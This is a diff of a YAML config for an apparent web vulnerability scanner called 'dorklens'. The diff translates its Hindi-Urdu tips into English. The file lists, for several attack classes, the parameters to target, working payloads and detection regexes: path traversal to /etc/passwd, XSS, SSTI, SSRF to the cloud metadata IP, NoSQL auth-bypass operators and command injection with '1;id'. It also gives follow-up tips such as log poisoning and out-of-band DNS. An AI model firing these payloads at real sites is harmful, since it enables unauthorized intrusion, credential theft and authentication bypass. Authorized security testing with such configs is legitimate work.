@@ -14,38 +14,38 @@ sqli_bool:
     - {type: pair_delta, pct: 10}
 lfi:
   params: [file, path, doc, include, template, page, download]
-  advice: '/etc/passwd ke baad log poisoning ya php://input try karein'
+  advice: 'After /etc/passwd, try log poisoning or php://input'
   payloads: ["../../../../etc/passwd", "../../../../windows/win.ini", "php://filter/convert.base64-encode/resource=index"]
   signals:
     - {type: regex, pattern: 'root:x:0:0|daemon:x:|\[fonts\]|PD9waHA'}
 open_redirect:
-  params: [url, redirect, next, return, target, callback, dest, to, ref, returnUrl, callback_url]
-  advice: 'OAuth/SSO flow mein is param ko phishing ke liye test karein'
+  params: [url, redirect, next, return, target, callback, dest, "to", "ref", "returnUrl", "callback_url"]
+  advice: 'Test this parameter in an OAuth/SSO flow for phishing potential'
   payloads: ["https://example.com/dorklens", "//example.com/dorklens"]
   signals:
     - {type: location_match, contains: "example.com"}
 xss_reflect:
   params: [q, s, search, keyword, name]
-  advice: 'browser mein khol kar confirm karein, phir CSP check karein'
+  advice: 'Open in a browser to confirm execution, then check CSP'
   payloads: ["dorklens<svg/onload=alert(1)>", "\"><img src=x onerror=alert(1)>"]
   signals:
     - {type: reflect, raw: true}
     - {type: length_delta, pct: 5}
 ssti:
   params: [name, q, template, msg]
-  advice: 'engine pakadne ke liye {{7*7}} ke baad {{7*"7"}} aur {{config}} try karein'
+  advice: 'Fingerprint the engine with {{7*7}}, then {{7*"7"}} and {{config}}'
   payloads: ["{{7*7}}", "${7*7}", "<%= 7*7 %>"]
   signals:
     - {type: regex, pattern: '(?<![0-9])49(?![0-9])'}
 ssrf:
   params: [url, src, target, image, host, feed]
-  advice: 'metadata IP ke baad internal ports scan karein'
+  advice: 'After the metadata IP, check internal ports'
   payloads: ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:80/"]
   signals:
     - {type: regex, pattern: 'ami-id|instance-id|It works!|Welcome to nginx|Apache2 .*Default Page'}
 nosqli:
   params: [id, user, username, email, login]
-  advice: 'JSON body wale POST endpoint par bhi yahi operator try karein'
+  advice: 'Try the same operators on JSON POST endpoints'
   payloads: ['{"$ne":null}', "[$ne]=1", "' || '1'=='1"]
   signals:
     - {type: length_delta, pct: 25}
@@ -56,7 +56,7 @@ nosqli_json:
   body: '{"email":{{INJECT}},"password":"x"}'
   baseline: '"probe@test.local"'
   params: [email, user, username]
-  advice: 'POST JSON ko curl ya browser devtools se confirm karein; auth bypass ho sakta hai'
+  advice: 'Confirm the JSON POST with curl or browser devtools; this may allow auth bypass'
   payloads: ['{"$ne":null}', '{"$gt":""}', '{"$regex":".*"}']
   signals:
     - {type: regex, pattern: 'authentication|token|admin@|Invalid password|SyntaxError|Mongo'}
@@ -64,7 +64,7 @@ nosqli_json:
     - {type: status_change}
 cmd_inject:
   params: [id, cmd, host, ip, ping, domain]
-  advice: 'blind case mein `sleep 5` ya out-of-band DNS use karein'
+  advice: 'For blind cases, use `sleep 5` or out-of-band DNS'
   payloads: ["1;id", "1|id", "$(id)", "`id`"]
   signals:
     - {type: regex, pattern: 'uid=\d+\([a-z_]+\).{0,40}gid=\d+'}
